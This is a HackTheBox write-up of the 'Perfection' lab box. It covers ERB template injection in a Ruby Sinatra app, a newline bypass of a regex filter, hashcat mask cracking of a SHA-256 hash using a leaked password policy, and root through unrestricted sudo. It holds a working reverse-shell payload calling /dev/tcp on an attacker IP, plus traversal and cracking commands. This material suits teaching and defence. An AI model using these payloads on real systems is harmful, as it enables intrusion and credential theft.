---
title: "Perfection"
date: 2024-03-09
type: docs
tags:
  - htb
  - linux
  - easy
  - ruby
  - sinatra
  - ssti
  - erb
  - waf-bypass
  - hashcat
  - mask-attack
  - sudo
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 22.04), **Difficulty:** Easy, **Released:** 2024-03-09, **IP:** `10.10.11.253` , `perfection.htb`

</div>

<div class="callout callout-warning">

**Partial**

My own notes stop after the recon and the path-traversal probe. Everything from the SSTI onward is reconstructed from published writeups and marked as such.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Ruby **Sinatra** app on nginx, a "Weighted Grade Calculator".
2. The `category` field is vulnerable to **ERB Server-Side Template Injection**. A regex filter blocks obvious payloads, but it only checks the first line, so a URL-encoded newline (`%0a`) smuggles the payload past it. RCE as **`susan`**.
3. `/var/mail/susan` reveals the site's password policy: `<name>_nohaxplz<10 digits>`. The web app's SQLite DB (`pw.db`) holds susan's SHA-256 hash. Build a hashcat **mask** from the policy and crack it.
4. `susan` has full `sudo`, so `sudo su` gives root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `susan` (mask-cracked from `pw.db`) | `susan_nohaxplz<digits>` (recovered by mask attack) |
| `user.txt` | `/home/susan/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Perfection is a tight two-step box about **filter bypass**. The SSTI itself is textbook ERB, but the app tries to defend with a regex allowlist on the input, and the whole foothold is realising the regex is anchored to a single line so a newline defeats it. The privesc is a nice piece of **targeted password cracking**: you do not brute force blindly, you read the organisation's own password policy out of a mail file, turn it into a hashcat mask, and the keyspace collapses to something crackable in seconds. Then `sudo` is wide open.

Related SSTI boxes: [Bolt](/writeups/hackthebox/linux/medium/bolt/), [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/), [Theseus](/writeups/tryhackme/linux/insane/theseus/), [Luanne](/writeups/hackthebox/bsd/medium/luanne/). Related "read the policy, build a mask, crack": this is the standout example. Related unrestricted `sudo`: [Blocky](/writeups/hackthebox/linux/easy/blocky/).

---

## Full Walkthrough

### Reconnaissance

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
```

The site is a simple calculator. You enter category names, weights and grades and it returns a weighted average. No obvious hidden endpoints.

### Path-traversal probe (dead end, but informative)

[Exploit-DB 5215](https://www.exploit-db.com/exploits/5215) describes a traversal in old Ruby WEBrick. It does not work here, but the 404 page is a gift:

```bash
curl -vv 'http://perfection.htb/..%5c..%5c..%5c/etc/passwd'
```

```html
HTTP/1.1 404 Not Found
Server: nginx
X-Cascade: pass

<h2>Sinatra doesn't know this ditty.</h2>
<img src='http://127.0.0.1:3000/__sinatra__/404.png'>
<pre>get '/etc/passwd' do
  "Hello World"
end</pre>
```

![Pasted image 20240409180829](Pasted-image-20240409180829.png)

This confirms a **Sinatra (Ruby)** backend on `127.0.0.1:3000` behind nginx. Sinatra defaults to **ERB** templates, so SSTI is the thing to try.

### SSTI in the category field, with a filter bypass

<div class="callout callout-note">

**The vulnerability and the bypass (reconstructed)**

The calculator interpolates each `category` value into an ERB string that is then rendered, so `<%= 7*7 %>` in a category name comes back as `49`. The app validates the field against a regex roughly like `/^[A-Za-z0-9 ]+$/`, which rejects `<`, `%`, `=`. The bug is that Ruby's `=~` / `match` without the `/m` and with `^`/`$` treats `$` as end-of-line, and the check only really guards the first line. URL-encoding a newline into the parameter (`category1=Math%0a<%25%3d`...`%25>`) puts the payload on line two where the regex never looks. So the request body ends up like:
```
category1=math%0A<%25%3d`id`%25>&gradeArr1=100&weightArr1=100&...
```
and the response contains the command output. Swap `id` for a reverse shell:
```
<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'` %>
```

</div>

That lands a shell as `susan`. `user.txt` is in her home.

### Privilege Escalation, policy-guided hash crack

`/var/mail/susan` (or `/var/spool/mail/susan`):

```
From: Tina the Sysadmin
Due to our recent security overhaul ... all passwords must follow this format:
{firstname}_{randomly generated string of 10 digits}
e.g. susan_nohaxplz1234567890
```

The Sinatra app keeps its users in a local SQLite database:

```bash
find / -name '*.db' 2>/dev/null
sqlite3 /var/www/*/pw.db 'select * from users'
# susan | abeb6f8eb5..." (SHA-256 of the password)
```

<div class="callout callout-note">

**Turning the policy into a mask**

The password is `susan_nohaxplz` plus exactly ten digits, so the keyspace is only 10^10. hashcat mode 1400 (raw SHA-256) with a mask:
```bash
hashcat -m 1400 -a 3 susan.hash 'susan_nohaxplz?d?d?d?d?d?d?d?d?d?d'
```
On a modern GPU this is a few seconds. Without the mail file you would never brute force 10^10, which is exactly why leaking a password policy matters.

</div>

```console
susan@perfection:~$ sudo -l
User susan may run the following commands on perfection:
    (ALL : ALL) ALL
susan@perfection:~$ sudo su
root@perfection:~# cat /root/root.txt
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/susan/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Do not allowlist with a line-anchored regex.** Use `\A`/`\z` in Ruby, not `^`/`$`, and validate the whole string. Better: never interpolate user input into a template at all, pass it as a locals hash.
- **Sinatra and Rails default to ERB**, so a Ruby stack plus reflected input means test SSTI early (`<%= 7*7 %>`).
- **Password policies are secrets.** A mail telling everyone the exact format turns an uncrackable hash into a ten second job.
- **Store password hashes with a slow KDF** (bcrypt/argon2), not raw SHA-256, so a known-format mask still costs real time.
- **Scope `sudo`.** `(ALL) ALL` on a service account is a free root.

---

## Related Writeups

- **SSTI (ERB / Jinja2):** [Bolt](/writeups/hackthebox/linux/medium/bolt/), [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/), [Theseus](/writeups/tryhackme/linux/insane/theseus/), [Luanne](/writeups/hackthebox/bsd/medium/luanne/)
- **WAF / input-filter bypass:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/) (whitespace), [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/)
- **Mask / rule based cracking:** [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Previse](/writeups/hackthebox/linux/easy/previse/)
- **Unrestricted `sudo` to root:** [Blocky](/writeups/hackthebox/linux/easy/blocky/)

## References

- PayloadsAllTheThings, SSTI (Ruby ERB) <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>
- hashcat mask attack <https://hashcat.net/wiki/doku.php?id=mask_attack>
- Sinatra templates <https://sinatrarb.com/intro.html#Views%20/%20Templates>
